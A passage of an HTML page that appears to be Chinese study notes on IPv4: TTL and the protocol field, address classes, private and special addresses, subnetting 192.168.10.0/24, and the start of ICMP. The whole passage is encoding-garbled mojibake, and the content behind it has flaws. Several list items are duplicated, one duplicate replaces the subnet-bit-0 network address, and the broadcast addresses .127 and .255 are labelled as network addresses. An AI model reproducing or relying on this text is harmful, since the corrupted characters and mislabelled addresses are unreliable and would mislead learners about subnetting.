æ³•åˆ°è¾¾ç›®çš„ç«¯ã€‚ç¯è·¯å‘ç”Ÿåï¼Œæ‰€æœ‰å‘å¾€è¿™ä¸ªç›®çš„åœ°çš„æŠ¥æ–‡éƒ½ä¼šè¢«å¾ªç¯è½¬å‘ï¼Œéšç€è¿™ç§æŠ¥æ–‡é€æ¸å¢å¤šï¼Œç½‘ç»œå°†ä¼šå‘ç”Ÿæ‹¥å¡ã€‚ </p><p>ä¸ºé¿å…ç¯è·¯å¯¼è‡´çš„ç½‘ç»œæ‹¥å¡ï¼ŒIPæŠ¥æ–‡å¤´ä¸­åŒ…å«ä¸€ä¸ªç”Ÿå­˜æ—¶é—´TTLï¼ˆTime To Liveï¼‰å­—æ®µã€‚ æŠ¥æ–‡æ¯ç»è¿‡ä¸€å°ä¸‰å±‚è®¾å¤‡ï¼ŒTTLå€¼å‡1ã€‚åˆå§‹TTLå€¼ç”±æºç«¯è®¾å¤‡è®¾ç½®ã€‚å½“æŠ¥æ–‡ä¸­çš„TTL é™ä¸º0æ—¶ï¼ŒæŠ¥æ–‡ä¼šè¢«ä¸¢å¼ƒã€‚åŒæ—¶ï¼Œä¸¢å¼ƒæŠ¥æ–‡çš„è®¾å¤‡ä¼šæ ¹æ®æŠ¥æ–‡å¤´ä¸­çš„æºIPåœ°å€å‘æºç«¯ å‘é€ICMPé”™è¯¯æ¶ˆæ¯ã€‚ï¼ˆæ³¨æ„ï¼šç½‘ç»œè®¾å¤‡ä¹Ÿå¯è¢«é…ç½®ä¸ºä¸å‘æºç«¯å‘é€ICMPé”™è¯¯æ¶ˆæ¯ã€‚ï¼‰</p><h3 id="åè®®å·"><a href="#åè®®å·" class="headerlink" title="åè®®å·"></a>åè®®å·</h3><p>ç›®çš„ç«¯çš„ç½‘ç»œå±‚åœ¨æ¥æ”¶å¹¶å¤„ç†æŠ¥æ–‡ä»¥åï¼Œéœ€è¦å†³å®šä¸‹ä¸€æ­¥å¯¹æŠ¥æ–‡å¦‚ä½•å¤„ç†ã€‚IPæŠ¥æ–‡å¤´ä¸­çš„å è®®å­—æ®µæ ‡è¯†äº†å°†ä¼šç»§ç»­å¤„ç†æŠ¥æ–‡çš„åè®®ã€‚</p><p>è¯¥å­—æ®µå¯ä»¥æ ‡è¯†ç½‘ç»œå±‚åè®®ï¼Œå¦‚ICMPï¼ˆInternet Control Message Protocolï¼Œå› ç‰¹ç½‘æ§åˆ¶ æŠ¥æ–‡åè®®ï¼Œå¯¹åº”å€¼0x01ï¼‰ï¼›ä¹Ÿå¯ä»¥æ ‡è¯†ä¸Šå±‚åè®®ï¼Œå¦‚TCPï¼ˆTransmission Control Protocolï¼Œ ä¼ è¾“æ§åˆ¶åè®®ï¼Œå¯¹åº”å€¼0x06ï¼‰ã€UDPï¼ˆUser Datagram Protocolï¼Œç”¨æˆ·æ•°æ®åŒ…åè®®ï¼Œå¯¹åº” å€¼0x11ï¼‰</p><h2 id="IPV4åœ°å€ä»‹ç»"><a href="#IPV4åœ°å€ä»‹ç»" class="headerlink" title="IPV4åœ°å€ä»‹ç»"></a>IPV4åœ°å€ä»‹ç»</h2><p>IPåœ°å€æ˜¯ç½‘ç»œä¸­ç”¨äºæ ‡è¯†ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæˆ–è€…ç½‘ç»œè®¾å¤‡çš„æ¥å£ï¼‰</p><p>ipåœ°å€ç”¨äºipæŠ¥æ–‡åœ¨ç½‘ç»œä¸­çš„å¯»å€</p><p>åœ¨IPç½‘ç»œä¸Šï¼Œå¦‚æœç”¨æˆ·è¦å°†ä¸€å°è®¡ç®—æœºè¿æ¥åˆ°Internetä¸Šï¼Œå°±éœ€è¦ç”³è¯·ä¸€ä¸ªIPåœ°å€ã€‚IPåœ°å€ å°±åƒç°å®ä¸­çš„åœ°å€ï¼Œå¯ä»¥æ ‡è¯†ç½‘ç»œä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ•°æ®å°±æ˜¯é€šè¿‡å®ƒæ¥æ‰¾åˆ°ç›®çš„åœ°çš„ã€‚å³æˆ‘ ä»¬é€šè¿‡IPåœ°å€å®ç°å…¨çƒèŒƒå›´å†…çš„ç½‘ç»œé€šä¿¡ã€‚</p><p>IPåœ°å€æ˜¯ç½‘ç»œè®¾å¤‡æ¥å£çš„å±æ€§ï¼Œä¸æ˜¯ç½‘ç»œè®¾å¤‡æœ¬èº«çš„å±æ€§ã€‚å½“æˆ‘ä»¬è¯´ç»™æŸå°è®¾å¤‡åˆ†é…ä¸€ä¸ªIP åœ°å€æ—¶ï¼Œå®è´¨ä¸Šæ˜¯æŒ‡ç»™è¿™å°è®¾å¤‡çš„æŸä¸ªæ¥å£åˆ†é…ä¸€ä¸ªIPåœ°å€ã€‚å¦‚æœè®¾å¤‡æœ‰å¤šä¸ªæ¥å£ï¼Œé€šå¸¸æ¯ ä¸ªæ¥å£éƒ½è‡³å°‘éœ€è¦ä¸€ä¸ªIPåœ°å€ã€‚</p><h3 id="IPV4åœ°å€çš„è¡¨ç¤º"><a href="#IPV4åœ°å€çš„è¡¨ç¤º" class="headerlink" title="IPV4åœ°å€çš„è¡¨ç¤º"></a>IPV4åœ°å€çš„è¡¨ç¤º</h3><p>Påœ°å€æ˜¯é•¿åº¦æ˜¯<strong>32 bit</strong>ï¼Œç”±4ä¸ªå­—èŠ‚ç»„æˆã€‚ä¸ºäº†é˜…è¯»å’Œä¹¦å†™æ–¹ä¾¿ï¼ŒIPåœ°å€é€šå¸¸é‡‡ç”¨ç‚¹åˆ† åè¿›åˆ¶æ•°æ¥è¡¨ç¤ºã€‚</p><p>IPV4åœ°å€é€šå¸¸é‡‡ç”¨ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤º</p><p>IPV4åœ°å€èŒƒå›´00000000.00000000.00000000.00000000<del>11111111.11111111.11111111.1111111 1ï¼Œå³0.0.0.0</del>255.255.255.255</p><h3 id="IPV4åœ°å€æ„æˆ"><a href="#IPV4åœ°å€æ„æˆ" class="headerlink" title="IPV4åœ°å€æ„æˆ"></a>IPV4åœ°å€æ„æˆ</h3><p>ç½‘ç»œéƒ¨åˆ†ï¼ˆç½‘ç»œå·ï¼‰ï¼šç”¨äºæ ‡è¯†ä¸€ä¸ªç½‘ç»œ</p><ul><li>IPåœ°å€ä¸èƒ½åæ˜ ä»»ä½•æœ‰å…³ä¸»æœºä½ç½®çš„åœ°ç†ä¿¡æ¯ï¼Œåªèƒ½é€šè¿‡ç½‘ç»œå·ç å­—æ®µåˆ¤æ–­å‡º ä¸»æœºå±äºå“ªä¸ªç½‘ç»œã€‚</li><li>å¯¹äºç½‘ç»œå·ç›¸åŒçš„è®¾å¤‡ï¼Œæ— è®ºå®é™…æ‰€å¤„çš„ç‰©ç†ä½ç½®å¦‚ä½•ï¼Œå®ƒä»¬éƒ½æ˜¯å¤„åœ¨åŒä¸€ä¸ª ç½‘ç»œä¸­ã€‚</li></ul><p>ä¸»æœºéƒ¨åˆ†ï¼ˆä¸»æœºå·ï¼‰ï¼šç”¨æ¥åŒºåˆ†ä¸€ä¸ªç½‘ç»œå†…çš„ä¸åŒä¸»æœº</p><p>ç½‘ç»œæ©ç ï¼ˆå­ç½‘æ©ç ï¼‰ï¼šåŒºåˆ†ä¸€ä¸ªipåœ°å€ä¸­çš„ç½‘ç»œéƒ¨åˆ†å’Œä¸»æœºéƒ¨åˆ†</p><ul><li>ç½‘ç»œæ©ç ä¸º32 bitï¼Œä¸IPåœ°å€çš„ä½æ•°ä¸€æ ·ï¼Œé€šå¸¸ä¹Ÿä»¥ç‚¹åˆ†åè¿›åˆ¶æ•°æ¥è¡¨ç¤ºã€‚</li><li>ç½‘ç»œæ©ç ä¸æ˜¯ä¸€ä¸ªIPåœ°å€ï¼Œåœ¨äºŒè¿›åˆ¶çš„è¡¨ç¤ºä¸Šæ˜¯ä¸€å †è¿ç»­çš„1ã€åé¢æ¥ä¸€å †è¿ç»­çš„0ã€‚</li><li>é€šå¸¸å°†ç½‘ç»œæ©ç ä¸­1çš„ä¸ªæ•°ç§°ä¸ºè¿™ä¸ªç½‘ç»œæ©ç çš„é•¿åº¦ã€‚å¦‚ï¼šæ©ç 0.0.0.0çš„é•¿åº¦æ˜¯0ï¼Œæ© ç 252.0.0.0çš„é•¿åº¦æ˜¯6ã€‚</li><li>ç½‘ç»œæ©ç ä¸€èˆ¬ä¸IPåœ°å€ç»“åˆä½¿ç”¨ï¼Œå…¶ä¸­å€¼ä¸º1çš„æ¯”ç‰¹å¯¹åº”IPåœ°å€ä¸­çš„ç½‘ç»œä½ï¼›å€¼ä¸º0çš„ æ¯”ç‰¹å¯¹åº”IPåœ°å€ä¸­çš„ä¸»æœºä½ï¼Œä»¥æ­¤æ¥è¾…åŠ©æˆ‘ä»¬è¯†åˆ«ä¸€ä¸ªIPåœ°å€ä¸­çš„ç½‘ç»œä½ä¸ä¸»æœºä½ã€‚ å³ç½‘ç»œæ©ç ä¸­1çš„ä¸ªæ•°å°±æ˜¯IPåœ°å€çš„ç½‘ç»œå·çš„ä½æ•°ï¼Œ0çš„ä¸ªæ•°å°±æ˜¯IPåœ°å€çš„ä¸»æœºå·çš„ä½ æ•°</li></ul><h3 id="IPåœ°å€å¯»å€"><a href="#IPåœ°å€å¯»å€" class="headerlink" title="IPåœ°å€å¯»å€"></a>IPåœ°å€å¯»å€</h3><p>ç½‘ç»œå·ç”¨äºè¡¨ç¤ºä¸»æœºæ‰€åœ¨çš„ç½‘ç»œï¼Œï¼Œç±»ä¼¼äºâ€œXXçœXXå¸‚XXåŒºXXå°åŒºâ€çš„ä½œç”¨ã€‚</p><p>ä¸»æœºå·ç”¨äºè¡¨ç¤ºç½‘ç»œå·æ‰€å®šä¹‰çš„ç½‘ç»œèŒƒå›´å†…æŸä¸ªç‰¹å®šçš„ä¸»æœºæ¥å£ï¼Œç±»ä¼¼äºé—¨ç‰Œå·â€œXXæ ‹XX å·â€çš„ä½œç”¨ã€‚</p><p>ç½‘ç»œå¯»å€ï¼š</p><ul><li>äºŒå±‚ç½‘ç»œå¯»å€ï¼šå¯ç›´æ¥é€šè¿‡IPåœ°å€ï¼Œæ‰¾åˆ°å¯¹åº”çš„ä¸»æœºæ¥å£ã€‚</li><li>ä¸‰å±‚ç½‘ç»œå¯»å€ï¼šåˆ©ç”¨ç½‘å…³è½¬å‘æ¥è‡ªä¸åŒç½‘æ®µä¹‹é—´çš„æ•°æ®åŒ…ã€‚</li></ul><p>ç½‘å…³ï¼š</p><ul><li>æŠ¥æ–‡è½¬å‘è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆéœ€è¦ç¡®å®šè½¬å‘è·¯å¾„ä»¥åŠé€šå¾€ç›®çš„ç½‘æ®µçš„æ¥å£ã€‚å¦‚æœç›®çš„ä¸»æœºä¸ æºä¸»æœºä¸åœ¨åŒä¸€ç½‘æ®µï¼ŒæŠ¥æ–‡éœ€è¦å…ˆè½¬å‘åˆ°ç½‘å…³ï¼Œç„¶åé€šè¿‡ç½‘å…³å°†æŠ¥æ–‡è½¬å‘åˆ°ç›®çš„ç½‘æ®µã€‚</li><li>ç½‘å…³æ˜¯æŒ‡æ¥æ”¶å¹¶å¤„ç†æœ¬åœ°ç½‘æ®µä¸»æœºå‘é€çš„æŠ¥æ–‡å¹¶è½¬å‘åˆ°ç›®çš„ç½‘æ®µçš„è®¾å¤‡ã€‚ä¸ºå®ç°æ­¤åŠŸèƒ½ï¼Œç½‘å…³å¿…é¡»çŸ¥é“<strong>ç›®çš„ç½‘æ®µçš„è·¯ç”±</strong>ã€‚ç½‘å…³è®¾å¤‡ä¸Šè¿æ¥æœ¬åœ°ç½‘æ®µçš„æ¥å£åœ°å€å³ä¸ºè¯¥ç½‘æ®µ çš„ç½‘å…³åœ°å€ã€‚</li></ul><h3 id="IPåœ°å€åˆ†ç±»ï¼ˆæœ‰ç±»ç¼–å€ï¼‰"><a href="#IPåœ°å€åˆ†ç±»ï¼ˆæœ‰ç±»ç¼–å€ï¼‰" class="headerlink" title="IPåœ°å€åˆ†ç±»ï¼ˆæœ‰ç±»ç¼–å€ï¼‰"></a>IPåœ°å€åˆ†ç±»ï¼ˆæœ‰ç±»ç¼–å€ï¼‰</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130100808354.png" alt="image-20220130100808354"></p><ul><li>Aã€Bã€Cã€Dã€Eç±»çš„ç±»åˆ«å­—æ®µåˆ†åˆ«æ˜¯äºŒè¿›åˆ¶æ•°0ã€10ã€110ã€1110ã€1111ï¼Œé€šè¿‡ç½‘ç»œ å·ç å­—æ®µçš„å‰å‡ ä¸ªæ¯”ç‰¹å°±å¯ä»¥åˆ¤æ–­IPåœ°å€å±äºå“ªä¸€ç±»ï¼Œè¿™æ˜¯åŒºåˆ†å„ç±»åœ°å€æœ€ç®€å•çš„æ–¹ æ³•ã€‚</li><li>Aã€Bã€Cä¸‰ç±»åœ°å€æ˜¯å•æ’­IPåœ°å€ (é™¤ä¸€äº›ç‰¹æ®Šåœ°å€å¤–)ï¼Œåªæœ‰è¿™ä¸‰ç±»åœ°å€æ‰èƒ½åˆ†é…ç»™ä¸» æœºæ¥å£ä½¿ç”¨ã€‚</li><li>Dç±»åœ°å€å±äºç»„æ’­IPåœ°å€ã€‚</li><li>Eç±»åœ°å€ä¸“é—¨ç”¨äºç‰¹æ®Šçš„å®éªŒç›®çš„ã€‚</li></ul><p>A,B,Cç±»åœ°å€æ¯”è¾ƒ</p><ul><li>ä½¿ç”¨Aç±»åœ°å€çš„ç½‘ç»œç§°ä¸ºAç±»ç½‘ç»œï¼›ä½¿ç”¨Bç±»åœ°å€çš„ç½‘ç»œç§°ä¸ºBç±»ç½‘ç»œï¼›ä½¿ç”¨Cç±»åœ°å€çš„ ç½‘ç»œç§°ä¸ºCç±»ç½‘ç»œã€‚</li><li>ä½¿ç”¨Aç±»åœ°å€çš„ç½‘ç»œç§°ä¸ºAç±»ç½‘ç»œï¼›ä½¿ç”¨Bç±»åœ°å€çš„ç½‘ç»œç§°ä¸ºBç±»ç½‘ç»œï¼›ä½¿ç”¨Cç±»åœ°å€çš„ ç½‘ç»œç§°ä¸ºCç±»ç½‘ç»œã€‚</li><li>Bç±»ç½‘ç»œçš„ç½‘ç»œå·ä¸º16 bitï¼Œä»‹äºAç±»å’ŒCç±»ç½‘ç»œä¹‹é—´ï¼›é¦–ä¸¤ä½æ’å®šä¸º10ï¼Œåœ°å€ç©ºé—´ä¸ºï¼š 128.0.0.0~191.255.255.255ã€‚</li><li>Cç±»ç½‘ç»œçš„ç½‘ç»œå·ä¸º24 bitï¼Œä¸ªæ•°å¾ˆå¤šï¼Œä½†æ‰€å…è®¸çš„ä¸»æœºæ¥å£çš„ä¸ªæ•°å°±å¾ˆå°‘ï¼›é¦–ä¸‰ä½æ’ å®šä¸º110ï¼Œåœ°å€ç©ºé—´ä¸ºï¼š192.0.0.0~223.255.255.255ã€‚</li></ul><p>ç»„æ’­åœ°å€ï¼šç»„æ’­èƒ½å®ç°ä¸€å¯¹å¤šä¼ é€’æ¶ˆæ¯ã€‚</p><h3 id="IPåœ°å€ç±»å‹"><a href="#IPåœ°å€ç±»å‹" class="headerlink" title="IPåœ°å€ç±»å‹"></a>IPåœ°å€ç±»å‹</h3><p>ç½‘æ®µï¼šä¸€ä¸ªç½‘ç»œå·æ‰€å®šä¹‰çš„ç½‘ç»œèŒƒå›´</p><p>ç½‘ç»œåœ°å€ï¼šç”¨äºæ ‡è¯†ä¸€ä¸ªç½‘ç»œ</p><ul><li>ç½‘ç»œå·ä¸ºXï¼Œä¸»æœºå·çš„æ¯ä¸ªæ¯”ç‰¹éƒ½ä¸º0ã€‚</li><li>ä¸èƒ½åˆ†é…ç»™å…·ä½“çš„ä¸»æœºæ¥å£ä½¿ç”¨ã€‚</li></ul><p>å¹¿æ’­åœ°å€ï¼šç”¨äºå‘è¯¥ç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœºå‘é€æ•°æ®çš„ç‰¹æ®Šåœ°å€</p><ul><li>ç½‘ç»œå·ä¸ºXï¼Œä¸»æœºå·çš„æ¯ä¸ªæ¯”ç‰¹éƒ½ä¸º1ã€‚</li><li>ä¸èƒ½åˆ†é…ç»™å…·ä½“çš„ä¸»æœºæ¥å£ä½¿ç”¨ã€‚</li></ul><p>å¯ç”¨åœ°å€ï¼šåˆç§°ä¸»æœºåœ°å€ï¼Œå¯ç”¨åˆ†é…ç»™å…·ä½“çš„ä¸»æœºæ¥å£ä½¿ç”¨ã€‚</p><p>ä¸€ä¸ªç½‘æ®µçš„ä¸»æœºä½ä¸ºnä½ï¼Œåˆ™IPåœ°å€æ•°ä¸ºï¼š2â¿ï¼Œå¯ç”¨IPåœ°å€æ•°ä¸ºï¼š2â¿-2 (å‡å»ç½‘ç»œåœ°å€ å’Œå¹¿æ’­åœ°å€)ã€‚</p><h3 id="ç§ç½‘IPåœ°å€"><a href="#ç§ç½‘IPåœ°å€" class="headerlink" title="ç§ç½‘IPåœ°å€"></a>ç§ç½‘IPåœ°å€</h3><p>å…¬ç½‘IPåœ°å€ï¼šç”±IANAç»Ÿä¸€åˆ†é…ï¼Œä»¥ä¿è¯ä»»ä½•ä¸€ä¸ªIPåœ°å€åœ¨Internetä¸Šçš„å”¯ä¸€æ€§ï¼Œè¿™é‡Œçš„IPåœ°å€æ˜¯æŒ‡å…¬ç½‘IPåœ°å€ã€‚</p><p>ç§ç½‘IPåœ°å€ï¼šç§ç½‘IPåœ°å€çš„ä½¿ç”¨ä½¿å¾—ç½‘ç»œå¯ä»¥å¾—åˆ°æ›´ä¸ºè‡ªç”±åœ°æ‰©å±•ï¼Œå› ä¸ºåŒä¸€ä¸ªç§ç½‘ IPåœ°å€æ˜¯å¯ä»¥åœ¨ä¸åŒçš„ç§æœ‰ç½‘ç»œä¸­é‡å¤ä½¿ç”¨çš„ã€‚åœ¨IPåœ°å€ç©ºé—´ä¸­ï¼ŒA,B,Cä¸‰ç±»åœ°å€å„é¢„ç•™äº†ä¸€äº›åœ°å€ä¸“é—¨ç”¨äºç§ç½‘IPåœ°å€</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130104358434.png" alt="image-20220130104358434"></p><p>ç§æœ‰ç½‘ç»œè¿æ¥åˆ°Internetï¼šç§æœ‰ç½‘ç»œç”±äºä½¿ç”¨äº†ç§ç½‘IPåœ°å€ï¼Œæ˜¯ä¸å…è®¸è¿æ¥åˆ°Internetçš„ã€‚ åæ¥åœ¨å®é™…éœ€æ±‚çš„é©±åŠ¨ä¸‹ï¼Œè®¸å¤šç§æœ‰ç½‘ç»œä¹Ÿå¸Œæœ›èƒ½å¤Ÿè¿æ¥åˆ°Internetä¸Šï¼Œä»è€Œå®ç°ç§ç½‘ä¸ Internetä¹‹é—´çš„é€šä¿¡ï¼Œä»¥åŠé€šè¿‡Internetå®ç°ç§ç½‘ä¸ç§ç½‘ä¹‹é—´çš„é€šä¿¡ã€‚ç§ç½‘ä¸Internetçš„äº’è”ï¼Œ å¿…é¡»ä½¿ç”¨ç½‘ç»œåœ°å€è½¬æ¢ (NAT)æŠ€æœ¯å®ç°ã€‚</p><p>NAT (Network Address Translation)ï¼Œç½‘ç»œåœ°å€è½¬æ¢ï¼Œå…¶åŸºæœ¬ä½œç”¨æ˜¯å®ç°ç§ç½‘IPåœ°å€ ä¸å…¬ç½‘IPåœ°å€ä¹‹é—´çš„è½¬æ¢ã€‚</p><h3 id="ç‰¹æ®ŠIPåœ°å€"><a href="#ç‰¹æ®ŠIPåœ°å€" class="headerlink" title="ç‰¹æ®ŠIPåœ°å€"></a>ç‰¹æ®ŠIPåœ°å€</h3><p>255.255.255.255ï¼šå¯ä½œä¸ºç›®çš„åœ°å€å‘å¾€ç½‘æ®µæ‰€æœ‰ä¸»æœºï¼ˆå—é™äºç½‘å…³ï¼‰</p><ul><li>è¿™ä¸ªåœ°å€ç§°ä¸ºæœ‰é™å¹¿æ’­åœ°å€ï¼Œå®ƒå¯ä»¥ä½œä¸ºä¸€ä¸ªIPæŠ¥æ–‡çš„ç›®çš„IPåœ°å€ä½¿ç”¨ã€‚</li><li>è·¯ç”±å™¨æ¥æ”¶åˆ°ç›®çš„IPåœ°å€ä¸ºæœ‰é™å¹¿æ’­åœ°å€çš„IPæŠ¥æ–‡åï¼Œä¼šåœæ­¢å¯¹è¯¥IPæŠ¥æ–‡çš„è½¬å‘ã€‚</li></ul><p>0.0.0.0ï¼š</p><ul><li>å¦‚æœæŠŠè¿™ä¸ªåœ°å€ä½œä¸ºç½‘ç»œåœ°å€ï¼Œå®ƒçš„æ„æ€å°±æ˜¯â€œä»»ä½•ç½‘ç»œâ€çš„ç½‘ç»œåœ°å€ï¼›å¦‚æœæŠŠè¿™ä¸ª åœ°å€ä½œä¸ºä¸»æœºæ¥å£åœ°å€ï¼Œå®ƒçš„æ„æ€å°±æ˜¯â€œè¿™ä¸ªç½‘ç»œä¸Šä¸»æœºæ¥å£â€çš„IPåœ°å€ã€‚</li><li>å¦‚æœæŠŠè¿™ä¸ªåœ°å€ä½œä¸ºç½‘ç»œåœ°å€ï¼Œå®ƒçš„æ„æ€å°±æ˜¯â€œä»»ä½•ç½‘ç»œâ€çš„ç½‘ç»œåœ°å€ï¼›å¦‚æœæŠŠè¿™ä¸ª åœ°å€ä½œä¸ºä¸»æœºæ¥å£åœ°å€ï¼Œå®ƒçš„æ„æ€å°±æ˜¯â€œè¿™ä¸ªç½‘ç»œä¸Šä¸»æœºæ¥å£â€çš„IPåœ°å€ã€‚</li></ul><p>127.0.0.1/8ï¼š</p><ul><li>è¿™ä¸ªåœ°å€ä¸ºç¯å›åœ°å€ï¼Œå®ƒå¯ä»¥ä½œä¸ºä¸€ä¸ªIPæŠ¥æ–‡çš„ç›®çš„IPåœ°å€ä½¿ç”¨ã€‚å…¶ä½œç”¨æ˜¯æµ‹è¯•è®¾å¤‡ è‡ªèº«çš„è½¯ä»¶ç³»ç»Ÿã€‚</li><li>ä¸€ä¸ªè®¾å¤‡äº§ç”Ÿçš„ã€ç›®çš„IPåœ°å€ä¸ºç¯å›åœ°å€çš„IPæŠ¥æ–‡æ˜¯ä¸å¯èƒ½ç¦»å¼€è¿™ä¸ªè®¾å¤‡æœ¬èº«çš„</li></ul><p>169.254.0.0/16ï¼š</p><ul><li>å¦‚æœä¸€ä¸ªç½‘ç»œè®¾å¤‡è·å–IPåœ°å€çš„æ–¹å¼è¢«è®¾ç½®æˆäº†è‡ªåŠ¨è·å–æ–¹å¼ï¼Œä½†æ˜¯è¯¥è®¾å¤‡åœ¨ç½‘ç»œä¸Šåˆæ²¡æœ‰æ‰¾åˆ°å¯ç”¨çš„DHCPï¼ˆåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼Œç”¨äºåŠ¨æ€åˆ†é…ç½‘ç»œé…ç½®å‚æ•°ï¼Œå¦‚IPåœ°å€ï¼‰æœåŠ¡å™¨ï¼Œé‚£ä¹ˆè¯¥è®¾å¤‡å°±ä¼šä½¿ç”¨169.254.0.0/16ç½‘æ®µçš„æŸä¸ªåœ° å€æ¥è¿›è¡Œä¸´æ—¶é€šä¿¡ã€‚</li></ul><p>IPV4ä¸IPV6</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130105012576.png" alt="image-20220130105012576"></p><h3 id="å­ç½‘åˆ’åˆ†"><a href="#å­ç½‘åˆ’åˆ†" class="headerlink" title="å­ç½‘åˆ’åˆ†"></a>å­ç½‘åˆ’åˆ†</h3><p>â€œæœ‰ç±»ç¼–å€â€çš„åœ°å€åˆ’åˆ†è¿‡äºæ­»æ¿ï¼Œåˆ’åˆ†çš„é¢—ç²’åº¦å¤ªå¤§ï¼Œä¼šæœ‰å¤§é‡çš„ä¸»æœºå·ä¸èƒ½è¢«å……åˆ†åˆ© ç”¨ï¼Œä»è€Œé€ æˆäº†å¤§é‡çš„IPåœ°å€èµ„æºæµªè´¹ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨å­ç½‘åˆ’åˆ†æ¥å‡å°‘åœ°å€æµªè´¹ï¼Œå³VLSM (Variable Length Subnet Mask)ï¼Œå¯å˜ é•¿å­ç½‘æ©ç ã€‚å°†ä¸€ä¸ªå¤§çš„æœ‰ç±»ç½‘ç»œï¼Œåˆ’åˆ†æˆè‹¥å¹²ä¸ªå°çš„å­ç½‘ï¼Œä½¿å¾—IPåœ°å€çš„ä½¿ç”¨æ›´ä¸ºç§‘å­¦ã€‚</p><h3 id="å¦‚ä½•è¿›è¡Œå­ç½‘åˆ’åˆ†"><a href="#å¦‚ä½•è¿›è¡Œå­ç½‘åˆ’åˆ†" class="headerlink" title="å¦‚ä½•è¿›è¡Œå­ç½‘åˆ’åˆ†"></a>å¦‚ä½•è¿›è¡Œå­ç½‘åˆ’åˆ†</h3><h4 id="åŸç½‘æ®µåˆ†æ"><a href="#åŸç½‘æ®µåˆ†æ" class="headerlink" title="åŸç½‘æ®µåˆ†æ"></a>åŸç½‘æ®µåˆ†æ</h4><p>å‡è®¾æœ‰ä¸€ä¸ªCç±»ç½‘æ®µåœ°å€ï¼š192.168.10.0ï¼›é»˜è®¤æƒ…å†µä¸‹ï¼Œç½‘ç»œæ©ç ä¸º24ä½ï¼ŒåŒ…æ‹¬24ä½ç½‘ç»œä½ï¼Œ 8ä½ä¸»æœºä½ã€‚é€šè¿‡è®¡ç®—å¯çŸ¥ï¼Œè¿™æ ·çš„ç½‘ç»œä¸­ï¼Œæœ‰256ä¸ªIPåœ°å€ï¼ˆ2çš„8æ¬¡æ–¹ï¼‰ã€‚</p><h4 id="å‘ä¸»æœºå€Ÿä½ï¼Œå½¢æˆå­ç½‘"><a href="#å‘ä¸»æœºå€Ÿä½ï¼Œå½¢æˆå­ç½‘" class="headerlink" title="å‘ä¸»æœºå€Ÿä½ï¼Œå½¢æˆå­ç½‘"></a>å‘ä¸»æœºå€Ÿä½ï¼Œå½¢æˆå­ç½‘</h4><p>ç°åœ¨ï¼Œå°†åŸæœ‰çš„24ä½ç½‘ç»œä½å‘ä¸»æœºä½å»â€œå€Ÿâ€1ä½ï¼Œè¿™æ ·ç½‘ç»œä½å°±æ‰©å……åˆ°äº†25ä½ï¼Œç›¸å¯¹çš„ä¸» æœºä½å°±å‡å°‘åˆ°äº†7ä½ï¼Œè€Œå€Ÿè¿‡æ¥çš„è¿™1ä½å°±æ˜¯<strong>å­ç½‘ä½</strong>ï¼Œæ­¤æ—¶ç½‘ç»œæ©ç å°±å˜æˆäº†25ä½ï¼Œå³ 255.255.255.128ï¼Œæˆ–/25ã€‚</p><p>å­ç½‘ä½ï¼šå¯å–å€¼0æˆ–å–å€¼1ï¼Œåˆ™å¾—åˆ°äº†ä¸¤ä¸ªæ–°çš„å­ç½‘ã€‚</p><p>é€šè¿‡è®¡ç®—å¯çŸ¥ï¼Œç°åœ¨ç½‘ç»œä¸­ï¼Œæœ‰128ä¸ªIPåœ°å€</p><h4 id="è®¡ç®—å­ç½‘ç½‘ç»œåœ°å€"><a href="#è®¡ç®—å­ç½‘ç½‘ç»œåœ°å€" class="headerlink" title="è®¡ç®—å­ç½‘ç½‘ç»œåœ°å€"></a>è®¡ç®—å­ç½‘ç½‘ç»œåœ°å€</h4><p>è®¡ç®—ç½‘ç»œåœ°å€ï¼Œä¸»æœºä½å…¨ä¸º0ï¼š</p><ul><li>è®¡ç®—ç½‘ç»œåœ°å€ï¼Œä¸»æœºä½å…¨ä¸º0ï¼š</li><li>å¦‚æœå­ç½‘ä½å–å€¼1ï¼Œåˆ™ç½‘ç»œåœ°å€ä¸º192.168.10.128/25</li></ul><h4 id="è®¡ç®—å­ç½‘å¹¿æ’­åœ°å€"><a href="#è®¡ç®—å­ç½‘å¹¿æ’­åœ°å€" class="headerlink" title="è®¡ç®—å­ç½‘å¹¿æ’­åœ°å€"></a>è®¡ç®—å­ç½‘å¹¿æ’­åœ°å€</h4><p>è®¡ç®—å¹¿æ’­åœ°å€ï¼Œä¸»æœºä½å…¨ä¸º1ï¼š</p><ul><li>å¦‚æœå­ç½‘ä½å–å€¼0ï¼Œåˆ™ç½‘ç»œåœ°å€ä¸º192.168.10.127/25ã€‚</li><li>å¦‚æœå­ç½‘ä½å–å€¼1ï¼Œåˆ™ç½‘ç»œåœ°å€ä¸º192.168.10.255/25ã€‚</li></ul><h2 id="ICMPåè®®"><a href="#ICMPåè®®" class="headerlink" title="ICMPåè®®"></a>ICMPåè®®</h2><p>æ˜¯IPåè®®çš„è¾…åŠ©åè®®ï¼Œç”¨æ¥åœ¨ç½‘ç»œè®¾å¤‡é—´ä¼ é€’å„ç§å·®é”™å’Œæ§åˆ¶ä¿¡æ¯ï¼Œå¯¹äºæ”¶é›†å„ç§ç½‘ç»œä¿¡æ¯ã€è¯Šæ–­å’Œæ’é™¤å„ç§ç½‘ç»œæ•…éšœç­‰æ–¹é¢èµ·ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚</p><ul><li>ä¸ºäº†æ›´æœ‰æ•ˆåœ°è½¬å‘IPæ•°æ®æŠ¥æ–‡å’Œæé«˜æ•°æ®æŠ¥æ–‡äº¤äº’æˆåŠŸçš„æœºä¼šï¼Œåœ¨ç½‘ç»œå±‚ä½¿ç”¨ICMPåè®®ã€‚ 